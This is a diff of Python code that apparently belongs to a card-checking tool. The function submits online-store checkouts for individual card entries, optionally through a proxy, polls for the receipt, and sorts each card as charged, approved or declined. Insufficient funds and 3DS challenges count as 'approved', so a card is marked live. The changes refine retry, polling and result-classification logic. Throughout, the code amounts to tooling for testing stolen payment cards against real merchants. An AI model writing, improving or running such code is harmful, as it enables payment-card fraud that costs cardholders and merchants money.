@@ -2261,7 +2818,8 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
                     pci_session_id, attempt_token, currency, country, signed_handles,
                     is_digital=is_digital,
                     tax_amount=current_tax,
-                    total_any=cover_any
+                    total_any=cover_any,
+                    payment_flexibility_terms_id=flex_terms_id
                 )
 
                 if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body:
@@ -2306,18 +2864,24 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
 
             receipt_id = extract_receipt_id(submit_body)
             if not receipt_id:
-                error_msg = extract_any_error(submit_body)
-                if "CAPTCHA" in (error_msg or ""):
-                    error_msg = "CARD_DECLINED"
-                if error_msg:
-                    result.status = CheckStatus.DECLINED
+                # A declined card carries an error code; a CHARGED card with an
+                # unparseable receipt id carries no code and must never be
+                # reported as a card error.
+                raw = extract_any_error(submit_body)
+                if raw:
+                    error_msg = normalize_card_result(raw)
+                    result.status = result_status_for(error_msg)
                     result.status_code = error_msg
                     result.error = Exception(error_msg)
-                    result.retryable = any(keyword in error_msg.lower() for keyword in ['inventory', 'retry', 'try again', 'generic'])
+                    result.retryable = (error_msg in ("GENERIC_ERROR", "CHECKOUT_RETRYABLE")
+                                        or any(keyword in error_msg.lower()
+                                               for keyword in ['inventory', 'retry', 'try again']))
                 else:
-                    result.status = CheckStatus.ERROR
-                    result.error = Exception("Step 10 failed: could not extract receiptId or error message")
-                    result.retryable = True
+                    error_msg, retry = no_code_failure(submit_body)
+                    result.status = CheckStatus.APPROVED if retry else CheckStatus.ERROR
+                    result.status_code = error_msg
+                    result.error = Exception(error_msg)
+                    result.retryable = retry
                 return result
 
             receipt_session_token = extract_receipt_session_token(submit_body)
@@ -2332,78 +2896,80 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
         
         # Step 11 - Poll for receipt
         poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
-        type_name_re = re.compile(r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"')
-        
-        for poll_num in range(1, 31):
+        type_name_re = re.compile(r'"__typename"\s*:\s*"([A-Za-z_]*Receipt[A-Za-z_]*)"')
+        seen_rounds = 0
+        max_patient_rounds = 120
+        patient_rounds = 0
+        last_outcome = "unknown"
+
+        while seen_rounds < 30:
             try:
                 _, poll_body = send_poll_for_receipt(
                     client, shop_url, checkout_url, checkout_token, session_token,
                     build_id, source_token, poll_for_receipt_id, receipt_id, receipt_session_token
                 )
-                
+
                 receipt_type = ""
                 match = type_name_re.search(poll_body)
                 if match:
                     receipt_type = match.group(1)
-                
-                status_code = extract_receipt_status_code(poll_body, receipt_type)
-                result.status_code = status_code
-                
-                # ── Handle ProcessingReceipt ──────────────────────────
-                if receipt_type == "ProcessingReceipt":
-                    result.status = CheckStatus.APPROVED  # أو CheckStatus.PROCESSING لو ضفته
-                    result.status_code = "PROCESSING"
-                    result.receipt_url = checkout_url
-                    return result
-                
-                if receipt_type in ["SuccessfulReceipt", "ProcessedReceipt"]:
+
+                outcome = classify_receipt(poll_body, receipt_type)
+                last_outcome = outcome
+                result.status_code = extract_receipt_status_code(poll_body, receipt_type)
+
+                if outcome == "success":
                     result.status = CheckStatus.CHARGED
                     result.status_code = "ORDER_PAID"
-                    try:
-                        poll_json = json.loads(poll_body)
-                        receipt_obj = poll_json.get("data", {}).get("receipt", {})
-                        conf_url = receipt_obj.get("confirmationPage", {}).get("url", "")
-                        result.receipt_url = conf_url or checkout_url
-                    except Exception:
+                    for path in (("data", "receipt", "confirmationPage", "url"),
+                                 ("data", "submitForCompletion", "receipt",
+                                  "confirmationPage", "url")):
+                        try:
+                            node = json.loads(poll_body)
+                            for key in path:
+                                node = node.get(key, {}) if isinstance(node, dict) else {}
+                            if isinstance(node, str) and node.startswith("http"):
+                                result.receipt_url = node
+                                break
+                        except Exception:
+                            pass
+                    if not result.receipt_url:
                         result.receipt_url = checkout_url
                     return result
-                
-                if receipt_type == "ActionRequiredReceipt":
+
+                if outcome == "action":
                     result.status = CheckStatus.APPROVED
                     result.status_code = "3DS_REQUIRED"
                     return result
-                
-                if receipt_type == "FailedReceipt":
-                    error_code = ""
-                    error_re = re.compile(r'"code"\s*:\s*"([^"]+)"')
-                    match = error_re.search(poll_body)
+
+                if outcome == "failure":
+                    match = re.search(r'"code"\s*:\s*"([^"]+)"', poll_body)
                     if match:
-                        error_code = match.group(1)
-                    if "CAPTCHA" in error_code:
-                        error_code = "CARD_DECLINED"
-                    
-                    if error_code == "INSUFFICIENT_FUNDS":
-                        result.status = CheckStatus.APPROVED
-                        result.status_code = "INSUFFICIENT_FUNDS"
-                        return result
-                    elif error_code == "CARD_DECLINED":
-                        result.status = CheckStatus.DECLINED
-                        result.error = Exception(f"{error_code}")
-                        return result
-                    elif error_code == "GENERIC_ERROR":
-                        result.status = CheckStatus.DECLINED
-                        result.status_code = "CARD_DECLINED"
-                        result.error = Exception("CARD_DECLINED")
-                        return result
+                        error_code = normalize_card_result(match.group(1))
+                        if error_code == "FAILED":
+                            error_code = "GENERIC_ERROR"
                     else:
-                        if "InventoryReservationFailure" in poll_body:
-                            result.status = CheckStatus.ERROR
-                            result.retryable = True
-                            return result
-                        result.status = CheckStatus.DECLINED
-                        result.error = Exception(f"{error_code}")
-                        return result
-                
+                        error_code = "UNKNOWN_ERROR"
+                        raw_msg = extract_any_error(poll_body)
+                        if raw_msg:
+                            error_code = f"UNKNOWN_ERROR: {raw_msg[:80]}"
+
+                    result.status = result_status_for(error_code)
+                    result.status_code = error_code
+                    result.error = Exception(error_code)
+                    result.retryable = (error_code in ("GENERIC_ERROR", "CHECKOUT_RETRYABLE")
+                                        or error_code == "01003"
+                                        or "InventoryReservationFailure" in poll_body)
+                    return result
+
+                if outcome in ("pending", "retryable"):
+                    patient_rounds += 1
+                else:
+                    seen_rounds += 1
+
+                if patient_rounds > max_patient_rounds:
+                    break
+
                 delay = 500
                 match = poll_delay_re.search(poll_body)
                 if match:
@@ -2413,16 +2979,28 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
                             delay = d
                     except ValueError:
                         pass
+                if outcome == "retryable":
+                    delay = max(delay, 400)
                 time.sleep(min(delay, 300) / 1000.0)
-                
+
             except Exception as e:
                 result.status = CheckStatus.ERROR
-                result.error = Exception(f"poll {poll_num} failed: {e}")
+                result.error = Exception(f"poll {seen_rounds + 1} failed: {e}")
                 return result
-        
+
+        if last_outcome in ("pending", "retryable", "unknown"):
+            # Shopify accepted the submission and asked us to wait, but never
+            # returned a terminal receipt. Report distinctly instead of a
+            # hard GENERIC_ERROR.
+            result.status = CheckStatus.APPROVED
+            result.status_code = "ORDER_SUBMITTED"
+            result.retryable = True
+            result.error = Exception("ORDER_SUBMITTED (receipt not confirmed)")
+            return result
+
         result.status = CheckStatus.ERROR
         result.error = Exception("exceeded 30 poll attempts")
         return result
-        
+
     finally:
         client.close()
